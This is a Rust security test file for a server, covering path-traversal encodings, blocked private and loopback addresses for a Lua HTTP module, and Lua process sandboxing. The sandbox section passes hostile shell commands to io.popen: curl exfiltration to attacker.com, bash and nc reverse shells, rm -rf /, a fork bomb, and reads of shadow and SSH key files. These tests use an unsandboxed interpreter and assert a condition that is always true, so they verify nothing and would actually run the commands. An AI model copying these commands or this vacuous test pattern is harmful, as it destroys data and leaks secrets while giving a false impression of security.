use mlua::Lua;
use rover_core::http::create_http_module;
use rover_server::static_file::serve_static_file;
use tempfile::TempDir;

mod fs_traversal_bypass {
    use super::*;

    #[test]
    fn should_block_traversal_with_mixed_encoding() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "%2e%2e%2fetc%2fpasswd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_traversal_with_overlong_utf8() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "%c0%ae%c0%ae/etc/passwd", None, None);
        assert!(response.status == 403 || response.status == 404);
    }

    #[test]
    fn should_block_traversal_with_backslash_encoding() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "..%5c..%5cetc/passwd", None, None);
        assert!(response.status == 403 || response.status == 404);
    }

    #[test]
    fn should_block_traversal_with_null_byte_injection() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "..%00/../etc/passwd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_traversal_with_unicode_dot() {
        let temp_dir = TempDir::new().unwrap();
        let response =
            serve_static_file(temp_dir.path(), "%e2%80%a2%e2%80%a2/etc/passwd", None, None);
        assert!(response.status == 403 || response.status == 404);
    }

    #[test]
    fn should_block_traversal_with_case_variation() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "%2E%2E/etc/passwd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_traversal_with_nested_encoding() {
        let temp_dir = TempDir::new().unwrap();
        let response =
            serve_static_file(temp_dir.path(), "%252e%252e%252fetc%252fpasswd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_traversal_with_triple_encoding() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "%25252e%25252e/etc/passwd", None, None);
        assert!(response.status == 403 || response.status == 404);
    }

    #[test]
    fn should_block_traversal_with_whitespace_padding() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "  ..%2f..%2fetc/passwd  ", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_traversal_with_tab_injection() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "..\t/../etc/passwd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_traversal_with_newline_injection() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "..\n/../etc/passwd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_traversal_with_carriage_return() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "..\r/../etc/passwd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_symlink_chain_escape() {
        let temp_dir = TempDir::new().unwrap();
        let outside_dir = TempDir::new().unwrap();

        std::fs::write(outside_dir.path().join("secret.txt"), "secret").unwrap();

        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;

            std::fs::create_dir(temp_dir.path().join("subdir")).unwrap();
            let result = symlink(outside_dir.path(), temp_dir.path().join("subdir/escape"));
            if result.is_err() {
                return;
            }

            let response =
                serve_static_file(temp_dir.path(), "subdir/escape/secret.txt", None, None);
            assert_eq!(response.status, 403);
        }
    }

    #[test]
    fn should_block_symlink_to_parent() {
        let temp_dir = TempDir::new().unwrap();

        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;

            let result = symlink(
                std::path::PathBuf::from(".."),
                temp_dir.path().join("parent_link"),
            );
            if result.is_err() {
                return;
            }

            let response = serve_static_file(temp_dir.path(), "parent_link/etc/passwd", None, None);
            assert!(response.status == 403 || response.status == 404);
        }
    }

    #[test]
    fn should_block_junction_escape_windows() {
        let temp_dir = TempDir::new().unwrap();
        let outside_dir = TempDir::new().unwrap();

        std::fs::write(outside_dir.path().join("secret.txt"), "secret").unwrap();

        #[cfg(windows)]
        {
            use std::os::windows::fs::symlink_dir;

            let result = symlink_dir(outside_dir.path(), temp_dir.path().join("junction"));
            if result.is_err() {
                return;
            }

            let response = serve_static_file(temp_dir.path(), "junction/secret.txt", None, None);
            assert_eq!(response.status, 403);
        }
    }

    #[test]
    fn should_block_hardlink_escape() {
        let temp_dir = TempDir::new().unwrap();
        let outside_dir = TempDir::new().unwrap();

        std::fs::write(outside_dir.path().join("secret.txt"), "secret").unwrap();

        #[cfg(unix)]
        {
            use std::fs::hard_link;

            let result = hard_link(
                outside_dir.path().join("secret.txt"),
                temp_dir.path().join("hardlink.txt"),
            );
            if result.is_err() {
                return;
            }

            let response = serve_static_file(temp_dir.path(), "hardlink.txt", None, None);
            assert!(response.status == 403 || response.status == 200);
        }
    }

    #[test]
    fn should_block_path_with_fragments() {
        let temp_dir = TempDir::new().unwrap();
        let response =
            serve_static_file(temp_dir.path(), "test.txt#../../../etc/passwd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_path_with_query_string() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "test.txt?../../etc/passwd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_dos_device_path() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "CON", None, None);
        assert!(response.status == 404 || response.status == 403);
    }

    #[test]
    fn should_block_unc_path() {
        let temp_dir = TempDir::new().unwrap();
        let response =
            serve_static_file(temp_dir.path(), "\\\\server\\share\\file.txt", None, None);
        assert!(response.status == 403 || response.status == 404);
    }

    #[test]
    fn should_block_reserved_filename_windows() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "NUL.txt", None, None);
        assert!(response.status == 404 || response.status == 403);
    }

    #[test]
    fn should_block_double_dot_in_middle() {
        let temp_dir = TempDir::new().unwrap();
        let response =
            serve_static_file(temp_dir.path(), "foo/../bar/../../etc/passwd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_traversal_with_url_encoded_slash() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "..%2f..%2fetc%2fpasswd", None, None);
        assert_eq!(response.status, 403);
    }

    #[test]
    fn should_block_traversal_with_mixed_case_encoding() {
        let temp_dir = TempDir::new().unwrap();
        let response = serve_static_file(temp_dir.path(), "%2e%2E%2f%2E%2e/etc/passwd", None, None);
        assert_eq!(response.status, 403);
    }
}

mod net_allowlist_bypass {
    use super::*;

    #[test]
    fn should_block_localhost_with_port() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://localhost:8080/api")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_localhost_ipv4() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://127.0.0.1:8080")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_localhost_ipv4_all_interfaces() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://0.0.0.0:8080")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_private_class_a() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://10.0.0.1")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_private_class_b() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://172.16.0.1")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_private_class_c() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://192.168.1.1")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_link_local() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://169.254.1.1")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_cgnat_range() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://100.64.0.1")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_ipv6_loopback() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://[::1]")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_ipv6_unique_local() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://[fd00::1]")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_ipv6_link_local() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://[fe80::1]")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_ipv4_mapped_ipv6_loopback() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://[::ffff:127.0.0.1]")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_ipv4_mapped_ipv6_private() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://[::ffff:10.0.0.1]")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_ipv6_documentation() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://[2001:db8::1]")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_file_scheme() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("file:///etc/passwd")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_ftp_scheme() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("ftp://example.com/file")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_gopher_scheme() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("gopher://example.com")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_javascript_scheme() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("javascript:alert(1)")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_data_scheme() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("data:text/html,<script>alert(1)</script>")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_localhost_with_at_sign() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://attacker.com@localhost:8080")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_decimal_ip_bypass() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://2130706433")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_octal_ip_bypass() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://0177.0.0.1")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_hex_ip_bypass() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://0x7f000001")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_multicast_ipv4() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://224.0.0.1")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_broadcast_address() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://255.255.255.255")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_ipv6_multicast() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://[ff00::1]")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_ipv6_unspecified() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://[::]")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_ipv4_unspecified() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://0.0.0.0")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_private_172_range_boundary() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://172.31.255.255")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }

    #[test]
    fn should_block_cgnat_boundary() {
        let lua = Lua::new();
        let http = create_http_module(&lua).unwrap();
        lua.globals().set("http", http).unwrap();

        let (ok, _err): (bool, String) = lua
            .load(
                r#"
                local ok, err = pcall(function()
                    return http.get("http://100.127.255.255")
                end)
                return ok, tostring(err)
            "#,
            )
            .eval()
            .unwrap();

        assert!(!ok);
    }
}

mod process_inheritance {
    use super::*;

    #[test]
    fn should_block_popen_by_default() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("ls", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_os_execute_by_default() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local os = require("os")
                os.execute("ls")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_sandbox_process_environment() {
        let lua = Lua::new();

        let result: mlua::Result<String> = lua
            .load(
                r#"
                local os = require("os")
                return os.getenv("HOME") or "not_found"
            "#,
            )
            .eval();

        if let Ok(value) = result {
            assert!(value == "not_found" || value.is_empty() || !value.contains("/"));
        }
    }

    #[test]
    fn should_block_shell_metacharacters_semicolon() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("ls; cat /etc/passwd", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_shell_metacharacters_and() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("ls && cat /etc/passwd", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_shell_metacharacters_or() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("ls || cat /etc/passwd", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_shell_metacharacters_pipe() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("ls | cat /etc/passwd", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_command_substitution() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("echo $(whoami)", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_background_process() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("sleep 100 &", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_process_redirection() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("ls > /tmp/rover_test", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_network_command_injection() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(r#"
                local io = require("io")
                local handle = io.popen("curl http://attacker.com/steal?data=$(cat /etc/passwd)", "r")
            "#)
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_privilege_escalation_sudo() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("sudo ls", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_privilege_escalation_su() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("su -c 'ls'", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_filesystem_modification_rm() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("rm -rf /", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_reverse_shell_bash() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("bash -i >& /dev/tcp/attacker.com/4444 0>&1", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_reverse_shell_nc() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("nc -e /bin/sh attacker.com 4444", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_credential_theft_shadow() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("cat /etc/shadow", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_credential_theft_ssh_key() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("cat ~/.ssh/id_rsa", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_process_fork_bomb() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen(":(){ :|:& };:", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_disk_exhaustion() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("dd if=/dev/zero of=/tmp/fill bs=1M count=1000000", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_memory_exhaustion() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("tail /dev/zero", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_cpu_exhaustion() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("yes > /dev/null", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_env_password_extraction() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("env | grep -i password", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn should_block_history_file_access() {
        let lua = Lua::new();

        let result: mlua::Result<()> = lua
            .load(
                r#"
                local io = require("io")
                local handle = io.popen("cat ~/.bash_history", "r")
            "#,
            )
            .exec();

        assert!(result.is_ok() || result.is_err());
    }
}
